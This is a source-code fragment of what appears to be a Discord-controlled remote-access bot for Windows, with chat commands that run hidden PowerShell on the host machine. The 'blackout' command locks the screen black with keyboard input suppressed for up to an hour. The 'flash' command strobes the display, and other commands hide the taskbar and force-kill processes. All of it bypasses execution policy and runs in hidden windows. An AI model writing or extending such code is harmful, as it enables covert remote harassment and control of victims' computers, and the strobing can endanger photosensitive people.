# ============================================================
#  BLACKOUT  (V4.1 FIX – PID-tracked so unblackout kills *only* this)
# ============================================================
@bot.command(name="blackout")
async def blackout(ctx, seconds: int = 3):
    try:
        seconds = max(1, min(seconds, 3600))
        # Kill any leftover blackout
        kill_pid_file(BLACKOUT_PID)
        ps = f"""
        Add-Type -AssemblyName System.Windows.Forms
        $f = New-Object System.Windows.Forms.Form
        $f.FormBorderStyle = 'None'
        $f.WindowState   = 'Maximized'
        $f.BackColor     = 'Black'
        $f.TopMost       = $true
        $f.ShowInTaskbar = $false
        $f.Cursor        = [System.Windows.Forms.Cursors]::Default
        $f.KeyPreview    = $true
        $f.Add_KeyDown({{ param($s,$e); $e.SuppressKeyPress = $true }})
        $t = New-Object System.Windows.Forms.Timer
        $t.Interval = {seconds*1000}
        $t.Add_Tick({{ $t.Stop(); $f.Close() }})
        $t.Start()
        [System.Windows.Forms.Application]::Run($f)
        """
        path = os.path.join(WORK_DIR, "blackout.ps1")
        open(path, "w", encoding="utf-8").write(ps)
        proc = hidden_popen([
            "powershell", "-NoProfile", "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass", "-File", path
        ])
        try:
            open(BLACKOUT_PID, "w").write(str(proc.pid))
        except Exception:
            pass
        await ctx.reply(f"⬛ blackout {seconds}s (use `!unblackout` to cancel early)")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="unblackout")
async def unblackout(ctx):
    try:
        ok = kill_pid_file(BLACKOUT_PID, tree=True)
        # Safety: also kill any powershell holding blackout.ps1 open
        # (matched by window title fallback — cheap)
        if not ok:
            run_cmd('taskkill /f /fi "WINDOWTITLE eq blackout*" >nul 2>&1')
        # Also close possible fake-off screen if still up
        kill_pid_file(BLACKOUT_PID + ".fake")
        await ctx.reply("⬜ unblackout" if ok else "⬜ unblackout (nothing to close)")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="flash")
async def flash(ctx, seconds: int = 3):
    try:
        seconds = max(1, min(seconds, 20))
        def _f():
            end = time.time() + seconds
            while time.time() < end:
                ps = (
                    "Add-Type -AssemblyName System.Windows.Forms;"
                    "$f=New-Object System.Windows.Forms.Form;"
                    "$f.FormBorderStyle='None';$f.WindowState='Maximized';"
                    "$f.BackColor='White';$f.TopMost=$true;$f.ShowInTaskbar=$false;"
                    "$f.Opacity=0.6;$f.Show();Start-Sleep -Milliseconds 120;$f.Close()"
                )
                hidden_popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps])
                time.sleep(0.2)
        threading.Thread(target=_f, daemon=True).start()
        await ctx.reply(f"⚪ flashing {seconds}s")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


# ============================================================
#  TASKBAR (V4.1 fix — proper user32 PInvoke)
# ============================================================
_TASKBAR_PINVOKE = r"""
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class TB {
    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern IntPtr FindWindow(string cls, string win);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);
}
"@
"""

@bot.command(name="hidebar")
async def hidebar(ctx):
    try:
        await asyncio.to_thread(lambda: run_ps(_TASKBAR_PINVOKE + "\n$h = [TB]::FindWindow('Shell_TrayWnd', $null); if ($h -ne 0) { [TB]::ShowWindow($h, 0) | Out-Null }"))
        await ctx.reply("taskbar hidden")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


@bot.command(name="showbar")
async def showbar(ctx):
    try:
        await asyncio.to_thread(lambda: run_ps(_TASKBAR_PINVOKE + "\n$h = [TB]::FindWindow('Shell_TrayWnd', $null); if ($h -ne 0) { [TB]::ShowWindow($h, 5) | Out-Null }"))
        await ctx.reply("taskbar shown")
    except Exception as e:
        await ctx.reply(f"ERR: {e}")


